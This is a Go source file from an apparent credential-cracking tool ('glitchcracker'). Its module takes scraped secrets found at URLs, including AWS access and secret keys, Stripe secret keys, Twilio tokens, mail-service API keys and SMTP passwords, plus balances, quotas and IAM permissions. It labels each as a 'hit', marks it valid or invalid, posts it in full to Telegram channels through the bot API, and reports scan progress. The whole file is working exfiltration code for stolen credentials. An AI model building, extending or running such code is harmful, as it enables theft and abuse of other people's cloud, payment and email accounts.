package telegram

import (
	"bytes"
	"encoding/json"
	"fmt"
	"glitchcracker/pkg/models"
	"html"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type Service struct {
	Token            string
	ValidChannelID   string
	InvalidChannelID string
	StatsChannelID   string
	StatsMessageID   int
	mu               sync.Mutex
	lastSend         time.Time
	sendDelay        time.Duration
	hitCounter       atomic.Int64
}

func NewService(token, validID, invalidID, statsID string) *Service {
	return &Service{
		Token:            token,
		ValidChannelID:   validID,
		InvalidChannelID: invalidID,
		StatsChannelID:   statsID,
		sendDelay:        150 * time.Millisecond,
	}
}

func (s *Service) rateLimit() {
	s.mu.Lock()
	defer s.mu.Unlock()
	elapsed := time.Since(s.lastSend)
	if elapsed < s.sendDelay {
		time.Sleep(s.sendDelay - elapsed)
	}
	s.lastSend = time.Now()
}

func serviceEmoji(res models.ScrapingResult) (string, string) {
	if res.AKIA != "" {
		return "☁️ AWS ☁️", "AWS"
	}
	if res.StripeSecretKey != "" {
		return "💳 STRIPE 💳", "STRIPE"
	}
	if res.SendGridApiKey != "" {
		return "📧 SENDGRID 📧", "SENDGRID"
	}
	if res.BrevoApiKey != "" {
		return "📨 BREVO 📨", "BREVO"
	}
	if res.XsmtpsibApiKey != "" {
		return "📨 XSMTP/BREVO 📨", "XSMTP"
	}
	if res.TwilioAccountSid != "" {
		return "📱 TWILIO 📱", "TWILIO"
	}
	if res.NewMailgunApiKey != "" || res.MailgunApiKey != "" {
		return "📬 MAILGUN 📬", "MAILGUN"
	}
	if res.PostmarkApiKey != "" {
		return "✉️ POSTMARK ✉️", "POSTMARK"
	}
	if res.MandrillApiKey != "" {
		return "🐒 MANDRILL 🐒", "MANDRILL"
	}
	if res.MailersendApiKey != "" {
		return "📩 MAILERSEND 📩", "MAILERSEND"
	}
	if res.SmtpHost != "" || res.SmtpPass != "" {
		return "🔧 SMTP 🔧", "SMTP"
	}
	if len(res.Services) > 0 {
		svc := strings.ToUpper(strings.Join(res.Services, "/"))
		return "🔑 " + svc + " 🔑", svc
	}
	return "🔑 UNKNOWN 🔑", "UNKNOWN"
}

func (s *Service) SendHit(res models.ScrapingResult) error {
	channelID := s.InvalidChannelID
	if res.Status == "valid" {
		channelID = s.ValidChannelID
	}
	if channelID == "" {
		return nil
	}

	hitNum := s.hitCounter.Add(1)
	svcLabel, _ := serviceEmoji(res)

	var msg strings.Builder

	msg.WriteString("━━━━━━━━━━━━━━\n")
	msg.WriteString(fmt.Sprintf("🎯 HIT #%d | %s\n", hitNum, svcLabel))
	msg.WriteString("━━━━━━━━━━━━━━\n\n")

	if res.Status == "valid" {
		msg.WriteString("✅ STATUT: VÉRIFIÉ VALIDE ✅\n\n")
	} else {
		msg.WriteString("❌ STATUT: INVALIDE ❌\n\n")
	}

	// Détails selon le service
	hasDetails := false
	var details strings.Builder

	if res.AKIA != "" {
		hasDetails = true
		details.WriteString("📊 DÉTAILS API:\n")
		if res.AwsStatus != "" {
			details.WriteString(fmt.Sprintf("📡 Status: %s\n", html.EscapeString(res.AwsStatus)))
		}
		if res.AwsSesQuota != "" && res.AwsSesQuota != "No Access" {
			details.WriteString(fmt.Sprintf("📧 SES Quota: %s\n", html.EscapeString(res.AwsSesQuota)))
		}
		if res.AwsSnsLimit != "" && res.AwsSnsLimit != "No Access" {
			details.WriteString(fmt.Sprintf("📱 SNS Limit: %s\n", html.EscapeString(res.AwsSnsLimit)))
		}
		if res.AwsPermissions != "" {
			details.WriteString(fmt.Sprintf("🔐 IAM: %s\n", html.EscapeString(res.AwsPermissions)))
		}
	}

	if res.StripeSecretKey != "" {
		hasDetails = true
		details.WriteString("📊 DÉTAILS API:\n")
		if res.StripeBalance != "" {
			details.WriteString(fmt.Sprintf("💰 Balance: %s\n", html.EscapeString(res.StripeBalance)))
		}
		if res.StripeBusinessName != "" {
			details.WriteString(fmt.Sprintf("🏢 Business: %s\n", html.EscapeString(res.StripeBusinessName)))
		}
	}

	if res.TwilioAccountSid != "" {
		hasDetails = true
		details.WriteString("📊 DÉTAILS API:\n")
		if res.ValidationMsg != "" {
			details.WriteString(fmt.Sprintf("📡 Status: active\n"))
		}
		if res.TwilioBalance != "" {
			details.WriteString(fmt.Sprintf("💰 Balance: %s\n", html.EscapeString(res.TwilioBalance)))
		}
		details.WriteString(fmt.Sprintf("📱 Phones: %d\n", res.TwilioNumbersCount))
	}

	if res.SendGridApiKey != "" {
		hasDetails = true
		details.WriteString("📊 DÉTAILS API:\n")
		if res.SendGridStatus != "" {
			details.WriteString(fmt.Sprintf("📡 Status: %s\n", html.EscapeString(res.SendGridStatus)))
		}
		if res.SendGridQuota != "" {
			details.WriteString(fmt.Sprintf("📧 Credits: %s (used: %d)\n", res.SendGridQuota, res.SendGridUsed))
		}
		if res.SendGridEmail != "" {
			details.WriteString(fmt.Sprintf("👤 Email: %s\n", html.EscapeString(res.SendGridEmail)))
		}
	}

	if res.BrevoApiKey != "" || res.XsmtpsibApiKey != "" {
		hasDetails = true
		details.WriteString("📊 DÉTAILS API:\n")
		if res.BrevoSender != "" {
			details.WriteString(fmt.Sprintf("👤 Account: %s\n", html.EscapeString(res.BrevoSender)))
		}
		if res.BrevoEmailCredits > 0 {
			details.WriteString(fmt.Sprintf("📧 Email Credits: %d\n", res.BrevoEmailCredits))
		}
		if res.BrevoSmsCredits > 0 {
			details.WriteString(fmt.Sprintf("📱 SMS Credits: %d\n", res.BrevoSmsCredits))
		}
	}

	if res.SmtpHost != "" || res.SmtpPass != "" {
		hasDetails = true
		details.WriteString("📊 DÉTAILS API:\n")
		if res.ValidationMsg != "" {
			details.WriteString(fmt.Sprintf("📡 Info: %s\n", html.EscapeString(res.ValidationMsg)))
		}
	}

	if !hasDetails && res.ValidationMsg != "" {
		details.WriteString("📊 DÉTAILS API:\n")
		details.WriteString(fmt.Sprintf("📡 Info: %s\n", html.EscapeString(res.ValidationMsg)))
	}

	if hasDetails || res.ValidationMsg != "" {
		msg.WriteString(details.String())
		msg.WriteString("\n")
	}

	// URL source
	if res.Url != "" {
		msg.WriteString(fmt.Sprintf("🌐 URL: %s\n\n", html.EscapeString(res.Url)))
	}

	// Credentials
	msg.WriteString("🔑 CREDENTIALS:\n")

	if res.AKIA != "" {
		msg.WriteString(fmt.Sprintf("🗝️ AKIA: <code>%s</code>\n", html.EscapeString(res.AKIA)))
		msg.WriteString(fmt.Sprintf("🔐 Secret: <code>%s</code>\n", html.EscapeString(res.SecretKey)))
	}
	if res.SendGridApiKey != "" {
		msg.WriteString(fmt.Sprintf("🔑 Key: <code>%s</code>\n", html.EscapeString(res.SendGridApiKey)))
	}
	if res.BrevoApiKey != "" {
		msg.WriteString(fmt.Sprintf("🔑 Key: <code>%s</code>\n", html.EscapeString(res.BrevoApiKey)))
	}
	if res.XsmtpsibApiKey != "" {
		msg.WriteString(fmt.Sprintf("🔑 Key: <code>%s</code>\n", html.EscapeString(res.XsmtpsibApiKey)))
	}
	if res.TwilioAccountSid != "" {
		msg.WriteString(fmt.Sprintf("🆔 Account SID: <code>%s</code>\n", html.EscapeString(res.TwilioAccountSid)))
		msg.WriteString(fmt.Sprintf("🔑 Auth Token: <code>%s</code>\n", html.EscapeString(res.TwilioAuthToken)))
	}
	if res.StripeSecretKey != "" {
		msg.WriteString(fmt.Sprintf("🔑 Key: <code>%s</code>\n", html.EscapeString(res.StripeSecretKey)))
	}
	if res.MailgunApiKey != "" {
		msg.WriteString(fmt.Sprintf("🔑 Key: <code>%s</code>\n", html.EscapeString(res.MailgunApiKey)))
	}
	if res.NewMailgunApiKey != "" {
		msg.WriteString(fmt.Sprintf("🔑 Key: <code>%s</code>\n", html.EscapeString(res.NewMailgunApiKey)))
	}
	if res.PostmarkApiKey != "" {
		msg.WriteString(fmt.Sprintf("🔑 Key: <code>%s</code>\n", html.EscapeString(res.PostmarkApiKey)))
	}
	if res.MandrillApiKey != "" {
		msg.WriteString(fmt.Sprintf("🔑 Key: <code>%s</code>\n", html.EscapeString(res.MandrillApiKey)))
	}
	if res.MailersendApiKey != "" {
		msg.WriteString(fmt.Sprintf("🔑 Key: <code>%s</code>\n", html.EscapeString(res.MailersendApiKey)))
	}
	if res.SmtpHost != "" {
		msg.WriteString(fmt.Sprintf("🖥️ Host: <code>%s</code>\n", html.EscapeString(res.SmtpHost)))
		if res.SmtpUser != "" {
			msg.WriteString(fmt.Sprintf("👤 User: <code>%s</code>\n", html.EscapeString(res.SmtpUser)))
		}
		msg.WriteString(fmt.Sprintf("🔒 Pass: <code>%s</code>\n", html.EscapeString(res.SmtpPass)))
	}
	for k, v := range res.Credentials {
		if strVal, ok := v.(string); ok && strVal != "" {
			msg.WriteString(fmt.Sprintf("  • %s: <code>%s</code>\n", html.EscapeString(k), html.EscapeString(strVal)))
		}
	}

	msg.WriteString(fmt.Sprintf("\n⏰ Détecté: %s UTC", time.Now().UTC().Format("2006-01-02 15:04:05")))

	s.rateLimit()
	return s.sendMessage(channelID, msg.String())
}

func (s *Service) SendStats(processed, total, hits int, cpm float64) error {
	if s.Token == "" || s.StatsChannelID == "" {
		return nil
	}
	pct := 0.0
	if total > 0 {
		pct = float64(processed) * 100 / float64(total)
	}
	bar := createProgressBar(pct, 15)

	msg := "━━━━━━━━━━━━━━\n"
	msg += "📊 SCAN IN PROGRESS\n"
	msg += "━━━━━━━━━━━━━━\n\n"
	msg += "📈 PROGRESSION:\n"
	msg += fmt.Sprintf("🌐 URLs: %d / %d\n", processed, total)
	msg += fmt.Sprintf("📊 Avancement: %s\n\n", bar)
	msg += "⚡ PERFORMANCE:\n"
	msg += fmt.Sprintf("🚀 CPM: %.0f\n", cpm)
	msg += fmt.Sprintf("🎯 Hits: %d\n\n", hits)
	msg += fmt.Sprintf("⏰ Mise à jour: %s", time.Now().UTC().Format("15:04:05"))

	s.rateLimit()
	if s.StatsMessageID != 0 {
		if err := s.editMessage(s.StatsChannelID, s.StatsMessageID, msg); err == nil {
			return nil
		}
		s.StatsMessageID = 0
	}
	msgID, err := s.sendMessageAndGetID(s.StatsChannelID, msg)
	if err == nil {
		s.StatsMessageID = msgID
	}
	return err
}

func createProgressBar(percent float64, length int) string {
	if percent < 0 {
		percent = 0
	}
	if percent > 100 {
		percent = 100
	}
	filled := int(percent / 100 * float64(length))
	bar := ""
	for i := 0; i < filled; i++ {
		bar += "█"
	}
	for i := filled; i < length; i++ {
		bar += "░"
	}
	return fmt.Sprintf("%s %.1f%%", bar, percent)
}

func (s *Service) sendMessage(channelID, text string) error {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", s.Token)
	payload := map[string]string{
		"chat_id":    channelID,
		"text":       text,
		"parse_mode": "HTML",
	}
	body, _ := json.Marshal(payload)
	resp, err := http.Post(apiURL, "application/json", bytes.NewBuffer(body))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		var result map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&result)
		return fmt.Errorf("telegram error (status %d): %v", resp.StatusCode, result["description"])
	}
	return nil
}

func (s *Service) sendMessageAndGetID(channelID, text string) (int, error) {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", s.Token)
	payload := map[string]string{
		"chat_id":    channelID,
		"text":       text,
		"parse_mode": "HTML",
	}
	body, _ := json.Marshal(payload)
	resp, err := http.Post(apiURL, "application/json", bytes.NewBuffer(body))
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()
	var result struct {
		Ok     bool `json:"ok"`
		Result struct {
			MessageID int `json:"message_id"`
		} `json:"result"`
		Description string `json:"description"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return 0, fmt.Errorf("failed to decode response: %w", err)
	}
	if !result.Ok {
		return 0, fmt.Errorf("telegram error: %s", result.Description)
	}
	return result.Result.MessageID, nil
}

func (s *Service) editMessage(channelID string, messageID int, text string) error {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/editMessageText", s.Token)
	payload := map[string]interface{}{
		"chat_id":    channelID,
		"message_id": messageID,
		"text":       text,
		"parse_mode": "HTML",
	}
	body, _ := json.Marshal(payload)
	resp, err := http.Post(apiURL, "application/json", bytes.NewBuffer(body))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		var result map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&result)
		return fmt.Errorf("telegram error (status %d): %v", resp.StatusCode, result["description"])
	}
	return nil
}
